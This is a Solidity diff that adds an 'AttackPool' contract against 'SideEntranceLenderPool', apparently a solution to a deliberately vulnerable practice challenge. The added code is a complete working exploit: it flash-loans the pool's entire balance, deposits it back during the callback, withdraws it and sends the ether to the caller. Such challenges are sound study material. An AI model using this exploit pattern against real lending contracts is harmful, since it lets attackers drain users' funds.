@@ -45,3 +45,35 @@ contract SideEntranceLenderPool {
             revert RepayFailed();
     }
 }
+
+contract AttackPool {
+    SideEntranceLenderPool pool;
+
+    constructor(address _pool) {
+        pool = SideEntranceLenderPool(_pool);
+    }
+
+    receive() external payable {}
+
+    function attack() external {
+        // 1. Flash loan entire balance of the pool
+        pool.flashLoan(address(pool).balance);
+        // 2. Deposit the funds back to the pool in the callback
+        // see execute()
+
+        // 3. Withdraw the funds
+        pool.withdraw();
+
+        // 4. Transfer the funds to the attacker
+        (bool success, ) = msg.sender.call{value: address(this).balance}("");
+        require(success);
+
+        // 5. Ensure the pool is drained
+        require(address(pool).balance == 0);
+    }
+
+    function execute() external payable {
+        // 2. Deposit the funds back to the pool
+        pool.deposit{value: msg.value}();
+    }
+}
